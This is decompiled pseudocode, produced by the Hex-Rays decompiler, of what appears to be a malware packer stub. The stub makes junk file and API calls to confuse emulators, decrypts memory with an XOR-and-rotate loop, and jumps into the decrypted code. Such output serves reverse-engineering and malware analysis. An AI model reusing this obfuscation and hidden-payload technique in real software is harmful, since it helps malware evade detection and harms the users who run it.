/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __stdcall sub_41462B(unsigned int, int, _DWORD *);
int start();

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401027; // weak
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern DWORD (__stdcall *GetLastError)();
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
CHAR aLtbo6Gck[] = "ltBo6.GCk"; // idb
WCHAR a9Sbt[] = L"\u2E39\u4253t"; // idb
CHAR a3Xit[] = "3.xIT"; // idb
CHAR aFqeSqv[] = "fqE.sqv"; // idb
CHAR ProcName[] = "OleSetAutoConvert"; // idb
CHAR aLq1ql7jtebj7dd[] = "lQ1QL7JteBJ7dDDzlVzeWQY7CHW.NXh"; // idb
WCHAR a61zviuvvpodprf[] = L"\u3136\u765A\u7569\u7656\u6F50\u7044\u4672\u3734\u3634\u6C55\u385A\u5732\u4547\u2E78\u4865s"; // idb
CHAR aXjhd375uk[] = "xjHd37.5Uk"; // idb
CHAR LibFileName[] = "OLE32.DLL"; // idb
WCHAR aKafqqwvQje[] = L"\u616B\u5166\u5771\u2E56\u6A51E"; // idb
WCHAR aJ2uguptfq6hell[] = L"\u326A\u6775\u7075\u6674\u3671\u6568\u4C6C\u6B37\u3347\u7375\u3470\u6F50\u4950\u2E62\u4D509"; // idb
WCHAR aQwzZom[] = L"\u7771\u2E5A\u6F7AM"; // idb
CHAR aAx5gi2wzeoneno[] = "ax5GI2WZeonENO.GkE"; // idb
WCHAR FileName[] = L"\u7875\u5172\u4A30\u696C\u6450\u3776\u466C\u4851\u7139\u396F\u364A\u2E6B\u4F57T"; // idb


//----- (0041462B) --------------------------------------------------------
int __stdcall sub_41462B(unsigned int a1, int a2, _DWORD *a3)
{
  unsigned int v3; // edx
  int result; // eax

  v3 = a1 >> 2;
  result = a2;
  do
  {
    *a3 += a2;
    *a3 ^= a2;
    *a3 = __ROR4__(*a3, 181);
    *a3 += a2;
    *a3 = -*a3;
    *a3 ^= 0x8457D4CF;
    *a3 = __ROR4__(*a3, 191);
    *a3 = -*a3;
    ++a3;
    --v3;
  }
  while ( v3 );
  return result;
}

//----- (00414671) --------------------------------------------------------
int start()
{
  HANDLE FileW; // eax
  struct _SECURITY_ATTRIBUTES *v2; // [esp-10h] [ebp-58h]
  DWORD v3; // [esp-Ch] [ebp-54h]
  DWORD v4; // [esp-Ch] [ebp-54h]
  DWORD v5; // [esp-8h] [ebp-50h]
  DWORD v6; // [esp-8h] [ebp-50h]
  void *v7; // [esp-4h] [ebp-4Ch]
  HANDLE v8; // [esp+0h] [ebp-48h]
  int v9; // [esp+4h] [ebp-44h]
  int v10; // [esp+8h] [ebp-40h]
  HANDLE hFile; // [esp+Ch] [ebp-3Ch]
  HANDLE v12; // [esp+10h] [ebp-38h]
  HANDLE v13; // [esp+18h] [ebp-30h]
  HANDLE v14; // [esp+24h] [ebp-24h]
  HMODULE hModule; // [esp+28h] [ebp-20h]
  HANDLE FileA; // [esp+30h] [ebp-18h]
  HANDLE v17; // [esp+34h] [ebp-14h]
  HANDLE v18; // [esp+3Ch] [ebp-Ch]
  HRESULT (__stdcall *OleSetAutoConvert)(const IID *const, const IID *const); // [esp+44h] [ebp-4h]

  hFile = CreateFileW(FileName, 0, 0, 0, 3u, 0x1A3u, 0);
  GetCommandLineA();
LABEL_2:
  if ( CreateFileA(aLq1ql7jtebj7dd, 0x20000000u, 4u, 0, 3u, 0x1A4u, 0) != (HANDLE)-1 )
  {
LABEL_11:
    CloseHandle(FileA);
    GetCommandLineA();
    GetFileSize(v17, 0);
    GetFileSize(v12, 0);
    GetLastError();
    __asm { jmp     [ebp+var_44] }
  }
  GetCommandLineA();
  GetFileType(hFile);
  v7 = 0;
  v5 = 261;
  v3 = 3;
  v2 = 0;
LABEL_4:
  FileW = CreateFileW(aJ2uguptfq6hell, 0, 4u, v2, v3, v5, v7);
  while ( 1 )
  {
    v8 = FileW;
    GetFileSize((HANDLE)0xFFFFFFFF, 0);
    GetFileSize(v8, 0);
    GetFileSize(v8, 0);
    if ( CreateFileW(a9Sbt, 0x60000000u, 6u, 0, 3u, 0x23u, 0) != (HANDLE)-1 )
      goto LABEL_2;
    GetLastError();
    v12 = CreateFileW(aQwzZom, 0x80000000, 2u, 0, 3u, 0x21u, 0);
    if ( v12 != (HANDLE)-1 )
      goto LABEL_4;
    CloseHandle((HANDLE)0xFFFFFFFF);
    GetCommandLineA();
    GetLastError();
    GetFileSize(v8, 0);
    CloseHandle((HANDLE)0xFFFFFFFF);
    FileA = CreateFileA(aXjhd375uk, 0, 5u, 0, 3u, 0x80u, 0);
    if ( FileA != (HANDLE)-1 )
      break;
    CloseHandle(v8);
    hModule = LoadLibraryA(LibFileName);
    v6 = 421;
    v4 = 3;
    while ( 1 )
    {
      v18 = CreateFileA(aAx5gi2wzeoneno, 0x80000000, 1u, 0, v4, v6, 0);
      GetFileType(v8);
      OleSetAutoConvert = (HRESULT (__stdcall *)(const IID *const, const IID *const))GetProcAddress(hModule, ProcName);
      GetCommandLineA();
      v14 = CreateFileW(aKafqqwvQje, 0xA0000000, 7u, 0, 3u, 0x122u, 0);
      FileW = CreateFileA(a3Xit, 0xE0000000, 5u, 0, 3u, 0x102u, 0);
      v17 = FileW;
      if ( FileW != (HANDLE)-1 )
        break;
      v13 = CreateFileW(a61zviuvvpodprf, 0xE0000000, 5u, 0, 3u, 0x123u, 0);
      CloseHandle((HANDLE)0xFFFFFFFF);
      GetCommandLineA();
      GetFileSize((HANDLE)0xFFFFFFFF, 0);
      GetFileType(v14);
      CloseHandle((HANDLE)0xFFFFFFFF);
      v6 = 0;
      GetCommandLineA();
      GetFileSize(v18, 0);
      v10 = ((int (*)(void))OleSetAutoConvert)();
      CloseHandle(v8);
      v9 = v10;
      if ( CreateFileA(aFqeSqv, 0, 4u, 0, 3u, 0x24u, 0) == (HANDLE)-1 )
        goto LABEL_11;
    }
  }
  GetLastError();
  GetLastError();
  CreateFileA(aLtbo6Gck, 0x20000000u, 3u, 0, 3u, 0x26u, 0);
  GetFileSize(v13, 0);
  ((void (__cdecl *)(int, int))((char *)sub_41462B + v10 + 2147024809))(79378, v10);
  return ((int (*)(void))loc_401027)();
}
// 414709: variable 'v2' is possibly undefined
// 414709: variable 'v3' is possibly undefined
// 414709: variable 'v5' is possibly undefined
// 414709: variable 'v7' is possibly undefined
// 41484D: variable 'v4' is possibly undefined
// 4149B6: variable 'FileA' is possibly undefined
// 4149D4: variable 'v17' is possibly undefined
// 4149EC: variable 'v12' is possibly undefined
// 4149BC: variable 'v9' is possibly undefined
// 414AC0: variable 'v13' is possibly undefined
// 414A85: variable 'v10' is possibly undefined

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
